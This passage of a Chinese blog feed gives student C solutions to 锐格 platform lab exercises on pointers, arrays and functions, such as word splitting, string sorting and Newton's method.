        <content type="html"><![CDATA[<h3 id="C语言-锐格实验"><a href="#C语言-锐格实验" class="headerlink" title="C语言 锐格实验"></a>C语言 锐格实验</h3><h5 id="四-指针与函数"><a href="#四-指针与函数" class="headerlink" title="四.指针与函数"></a>四.指针与函数</h5><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>某班级期末考试科目为数学、英语和物理。有最多不超过人参加考试。请编程计算：每个同学的总分和平均分；每门课程的总分和平均分？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">double a[25][5];</span><br><span class="line">double sub[5];</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i,j;</span><br><span class="line">    double sum;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;5;i++) sub[i]=0;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            scanf(<span class="string">&quot;%lf %lf %lf&quot;</span>,&amp;a[i][1],&amp;a[i][2],&amp;a[i][3]);</span><br><span class="line">            sub[0]+=a[i][1];</span><br><span class="line">            sub[1]+=a[i][2];</span><br><span class="line">            sub[2]+=a[i][3];</span><br><span class="line">            sum=(a[i][1]+a[i][2]+a[i][3]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%.2lf %.2lf\n&quot;</span>,sum,(sum/3));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;3;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%.2lf %.2lf\n&quot;</span>,sub[i],sub[i]/n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>有一个用空格，逗号或是句号分隔的许多英文单词组成的字符串（分隔的空格可以是多个）。请编写程序将这些单词分开并输出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">char a[2000];</span><br><span class="line">char b[1000][20];</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i,j,wordnum,flag,t,tt,c,*o;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d\n&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        t=n;</span><br><span class="line">        <span class="keyword">while</span>(t--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(i=0;i&lt;1000;i++) b[i][0]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            j=0;</span><br><span class="line">            flag=0;</span><br><span class="line">            wordnum=0;</span><br><span class="line">            gets(a);</span><br><span class="line">            <span class="keyword">if</span>(a[0]!=<span class="string">&#x27;\0&#x27;</span> &amp;&amp; a[0]!=<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">for</span>(i=0;a[i]!=<span class="string">&#x27;\0&#x27;</span>;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i]!=<span class="string">&#x27; &#x27;</span> &amp;&amp; a[i]!= <span class="string">&#x27;,&#x27;</span> &amp;&amp; a[i]!=<span class="string">&#x27;.&#x27;</span> &amp;&amp; ((a[i]&gt;=<span class="string">&#x27;a&#x27;</span> &amp;&amp; a[i]&lt;=<span class="string">&#x27;z&#x27;</span>) || (a[i]&gt;=<span class="string">&#x27;A&#x27;</span> &amp;&amp; a[i]&lt;=<span class="string">&#x27;Z&#x27;</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    b[wordnum][j++]=a[i];</span><br><span class="line">                    flag=1;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(flag==1)</span><br><span class="line">                    &#123;</span><br><span class="line">                        b[wordnum][j]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                        wordnum++;</span><br><span class="line">                        tt=j;</span><br><span class="line">                        j=0;</span><br><span class="line">                        flag=0;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(a[i]==<span class="string">&#x27;\0&#x27;</span>) wordnum++;</span><br><span class="line">            <span class="keyword">if</span>(a[i-1]&lt;<span class="string">&#x27;a&#x27;</span> || a[i-1]&gt;<span class="string">&#x27;z&#x27;</span> || a[i-1]&lt;<span class="string">&#x27;A&#x27;</span> || a[i-1]&gt;<span class="string">&#x27;Z&#x27;</span>) wordnum--;</span><br><span class="line">            b[wordnum][j]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span>(i=0;i&lt;wordnum+1;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(i!=wordnum)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%s &quot;</span>,b[i]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,b[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;分出了%d个单词\n&quot;</span>,wordnum);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>程序完成在一些已知字符串中查找含有“<em>”最多的字符串的功能。要求用返回指针值的函数完成：找到这个字符串，函数返回“</em>”最多的字符串的首地址。并将找到的字符串输出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i,num[105],j,max,maxl;</span><br><span class="line">    char a[105][55];</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;105;i++) num[i]=0;</span><br><span class="line">        getchar();</span><br><span class="line">        char c=getchar();</span><br><span class="line">        <span class="keyword">if</span>(c==<span class="string">&#x27;\0&#x27;</span>) n++;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            scanf(<span class="string">&quot;%s&quot;</span>,(a+i));</span><br><span class="line">            <span class="keyword">for</span>(j=0;a[i][j]!=<span class="string">&#x27;\0&#x27;</span>;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i][j]==<span class="string">&#x27;*&#x27;</span>) num[i]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i==0)</span><br><span class="line">            &#123;</span><br><span class="line">                max=num[0];</span><br><span class="line">                maxl=0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(num[i]&gt;max)</span><br><span class="line">                &#123;</span><br><span class="line">                    max=num[i];</span><br><span class="line">                    maxl=i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,a[maxl]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><p>用申请的动态开辟的内存空间存放()个字符串，每个字符串的长度不超过50，将其保存，后排序输出。要求：每个字符串占用的空间是用动态开辟的内存分配的。字符串排序和输出用自定义函数实现。 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i,j,t;</span><br><span class="line">    char (*p)[50];</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        getchar();getchar();</span><br><span class="line">        p=(char (*)[50])calloc(n,sizeof(char[50]));</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            gets((p+i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(j=i+1;j&lt;n;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                t=strcmp(p+i,p+j);</span><br><span class="line">                <span class="keyword">if</span>(t&gt;0)</span><br><span class="line">                &#123;</span><br><span class="line">                    char tmp[50];</span><br><span class="line">                    strcpy(tmp,p+i);</span><br><span class="line">                    strcpy(p+i,p+j);</span><br><span class="line">                    strcpy(p+j,tmp);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,p+i);</span><br><span class="line">        &#125;</span><br><span class="line">        free(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><p>编写程序用迭代法求方程。请用牛顿迭代法编程完成求以下三个方程的根。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;math.h&gt;</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    //注意几点：exp函数，负数转换，</span><br><span class="line">    int n;</span><br><span class="line">    double x,y,deduct;</span><br><span class="line">    double cha,t;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d%lf%lf&quot;</span>,&amp;n,&amp;x,&amp;deduct)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        cha=1;</span><br><span class="line">        <span class="keyword">if</span>(n==1)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(cha&gt;=deduct)</span><br><span class="line">            &#123;</span><br><span class="line">                t=x;</span><br><span class="line">                x=x-(x*x*x-x*x-1)/(3*x*x-2*x);</span><br><span class="line">                cha=t-x;</span><br><span class="line">                <span class="keyword">if</span>(cha&lt;=0) cha=0-cha;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(n==2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(cha&gt;=deduct)</span><br><span class="line">            &#123;</span><br><span class="line">                t=x;</span><br><span class="line">                x=x-(x*x*x*x-3*x+1)/(4*x*x*x-3);</span><br><span class="line">                cha=t-x;</span><br><span class="line">                <span class="keyword">if</span>(cha&lt;0) cha=0-cha;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(n==3)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(cha&gt;=deduct)</span><br><span class="line">            &#123;</span><br><span class="line">                t=x;</span><br><span class="line">                x=x-(x-exp(-x))/(1+exp(-x));</span><br><span class="line">                cha=t-x;</span><br><span class="line">                <span class="keyword">if</span>(cha&lt;0) cha=0-cha;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %.2e %.5lf\n&quot;</span>,n,deduct,x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 基础 </tag>
            
            <tag> 锐格 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 语言实验 3</title>
      <link href="/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-3/"/>
      <url>/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-3/</url>
      
        <content type="html"><![CDATA[<h3 id="C语言-锐格实验"><a href="#C语言-锐格实验" class="headerlink" title="C语言 锐格实验"></a>C语言 锐格实验</h3><h5 id="三-指针与数组"><a href="#三-指针与数组" class="headerlink" title="三.指针与数组"></a>三.指针与数组</h5><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>请将输入的三个整数按照从小到大的顺序输出。整数的范围从。输入数据有多组，每组输入三个整型数据，采用指针编程实现将三个数从小到大排序，排序后输出。要求排序部分用自定义函数实现。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">int swap(int *x,int *y,int *z);</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int a,b,c;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d %d %d&quot;</span>,&amp;a,&amp;b,&amp;c)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        swap(&amp;a,&amp;b,&amp;c);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>,a,b,c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int swap(int *x,int *y,int *z)</span><br><span class="line">&#123;</span><br><span class="line">    int t;</span><br><span class="line">    <span class="keyword">if</span>(*x &gt; *y)</span><br><span class="line">    &#123;</span><br><span class="line">        t=*x;</span><br><span class="line">        *x=*y;</span><br><span class="line">        *y=t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(*x&gt;*z)</span><br><span class="line">    &#123;</span><br><span class="line">        t=*x;</span><br><span class="line">        *x=*z;</span><br><span class="line">        *z=t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(*y&gt;*z)</span><br><span class="line">    &#123;</span><br><span class="line">        t=*y;</span><br><span class="line">        *y=*z;</span><br><span class="line">        *z=t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>利用指针完成对一个数组中大于指定数据的过滤，并将过滤后的数据存储并输出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,x,i,num;</span><br><span class="line">    int a[200],b[200];</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;x)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++) scanf(<span class="string">&quot;%d&quot;</span>,a+i);</span><br><span class="line">        num=save(a,n,x,b);</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;num;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,b[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int save(int *a,int n,int x,int *b)</span><br><span class="line">&#123;</span><br><span class="line">    int j=0,k=0;</span><br><span class="line">    <span class="keyword">for</span>(j;j&lt;n;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[j]&gt;=x)</span><br><span class="line">            b[k++] = a[j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> k;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>程序完成对输入的整数，是否在符合要求的范围内的检查功能。如果在规定的次数内输入了符合要求的数据，函数返回，在规定的次数内输入的数据均不在符合要求的范围内，函数返回0。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,min,max,t,i;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d %d %d&quot;</span>,&amp;n,&amp;min,&amp;max)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            scanf(<span class="string">&quot;%d&quot;</span>,&amp;t);</span><br><span class="line">            <span class="keyword">if</span>(t&gt;=min &amp;&amp; t&lt;=max)</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,1,t);</span><br><span class="line">                 <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(i==n-1)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,0,t);</span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="built_in">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><p>本题利用指针完成将一个数字字符串转换为int整数的程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    char a[100];</span><br><span class="line">    <span class="keyword">while</span>(gets(a))</span><br><span class="line">    &#123;</span><br><span class="line">        int l=strlen(a);</span><br><span class="line">        <span class="keyword">if</span>(a[1]&lt;<span class="string">&#x27;0&#x27;</span> || a[1]&gt;<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,0);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(i=0;i&lt;l;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(i==0)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(a[0]==<span class="string">&#x27;+&#x27;</span>) <span class="built_in">continue</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(a[0] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(a[0]&gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; a[0]&lt;=<span class="string">&#x27;9&#x27;</span>) <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,a[0]);</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(a[0]==<span class="string">&#x27; &#x27;</span>) <span class="built_in">continue</span>;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,0);</span><br><span class="line">                        <span class="built_in">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(a[i]&gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; a[i]&lt;=<span class="string">&#x27;9&#x27;</span>) <span class="built_in">printf</span>(<span 